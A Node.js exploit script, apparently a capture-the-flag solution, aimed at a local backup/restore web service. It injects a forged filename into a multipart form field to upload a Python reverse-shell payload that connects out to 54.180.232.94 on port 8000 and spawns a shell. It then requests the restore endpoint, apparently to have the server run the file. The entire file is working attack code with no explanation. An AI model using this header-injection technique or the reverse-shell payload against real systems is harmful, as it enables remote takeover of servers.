const needle = require("needle");

const BACKUP = "http://localhost:1338"

const data = {
    id: "asdf",
    angel: {
        "name": "test",
        "actress": "test",
        "movie": "test",
        "talents": {
            "0": "Intuition",
            "1": "Skiing",
            "2": "Gun Wielding"
        },
    },
    "file\"; filename=\"4TdXJCLY9CA9T4n2j36dKJiMarL9M_lb.py": 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("54.180.232.94",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
};

const boundary = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);

needle.post(BACKUP + '/backup', data, { multipart: true, boundary: boundary }, (error, response) => {
    if (error) {
        console.log(error);
    }
    else {
        console.log(response);
    }
});

needle.get(BACKUP + `/restore?id=4TdXJCLY9CA9T4n2j36dKJiMarL9M_lb`, (error, response) => {
    try {
        if (error) throw new Error(error);
        if (response.body == "ERROR") throw new Error("HTTP Client error");
        return console.log(response.body);
    } catch (e) {
        console.log(e);
    }
})